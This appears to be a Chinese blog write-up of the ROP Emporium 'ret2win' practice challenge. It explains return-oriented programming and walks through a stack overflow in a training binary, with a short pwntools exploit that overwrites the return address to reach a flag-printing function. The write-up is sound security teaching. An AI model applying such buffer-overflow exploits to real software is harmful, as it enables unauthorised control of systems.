---
title: ROP Emporium の ret2win
date: 2020-05-19 11:12:40
categories:
- WriteUPs
- ROP Emprium
tags:
- PWN
- ROP
- Stack
---
## Introduction

ROP是Return Oriented Programming（面向返回的编程）的缩写，是绕过DEP保护的攻击手段汇总。[ROP Emporium](https://ropemporium.com)是一个提供ROP练习的网站，对于理解和掌握ROP很有帮助。

<!-- more -->

## ROP链基础原理

根据函数调用规则，当跳转函数的时候会首先将子函数的返回地址入栈。对于被调用者来说，栈顶是返回地址，接着是自己的参数。然后，被调用者会对内存空间执行自己的操作，但是结束时会清理自己的占据的栈空间，使栈恢复到被调用之前的情况，实现栈平衡。最后被调用函数一般是以ret指令结尾，该指令将栈顶地址传递到IP寄存器，随后代码会跳转到栈顶存放的返回地址的位置。

rop链即是基于以上这个简单的原理，在代码空间中寻找以ret结尾的代码片段或函数（代码片段称为Rop gadgets），组合可以实现拓展可写栈空间、写入内存、shell等功能，依靠ret将代码执行权紧握在自己的手里。

## ret2win

ret2win是ROP Emporium提供的第一个ROP challenge，且和该网站提供的其他程序一样，分成了32位和64位的程序。这个challenge比较简单，下面简单的分析一下。

### ret2win32

#### Step 1

程序运行截图：

![](/img/ret2win/ret2win1.png)

checksec：32位程序，开启了DEP，所以需要考虑创造ROP链绕过

![](/img/ret2win/ret2win2.png)

#### Step 2

把程序丢到hopper disassembler里，找到一个有趣的函数pwnme，显然这里存在栈溢出：

![](/img/ret2win/ret2win3.png)

同时我们还发现一个很有趣的函数ret2win，通过这个函数可以直接查看flag的值：

![](/img/ret2win/ret2win4.png)

#### Step 3

用gdb看下这个程序，首先是main函数：

![](/img/ret2win/ret2win5.png)

在pwnme函数下个断点：

![](/img/ret2win/ret2win6.png)

可以看到此时栈顶指针ESP里存放的是0x80485d9，这是main函数call pwnme指令的下一条指令的地址。

所以我们的思路是将pwnme函数的返回地址覆盖为ret2win函数的入口。

EXP如下：

```Python
from pwn import *

sh = process('./ret2win32')
elf = ELF('./ret2win32')

shell_addr = elf.symbols['ret2win']

payload = 'a' * (0x28 + 0x4) + p32(shell_addr)

sh.send(payload)

sh.interactive()
sh.close()
```

执行后结果：

![](/img/ret2win/ret2win7.png)

#### Appendix

我们把程序断在发送完payload之后，看一下此时堆栈里面的情况：

![](/img/ret2win/ret2win8.png)

可以看到此时当pwnme结束之后，程序将跳转到ret2win函数。这样就完成了我们预定的栈布局，可以成功的实现对程序的控制。

### ret2win64

这里ret2win64仅仅是偏移量不一样，然后再注意一下64位程序EBP是0x8字节长度即可。就不具体分析了。

## 总结

这种ROP叫做ret2text，即执行程序中已有代码，例如程序中写有system等系统的调用函数，我们就可以利用控制已有的gadgets（以ret结尾的指令序列，通过这些指令序列，可以修改某些地址的内容）控制system函数。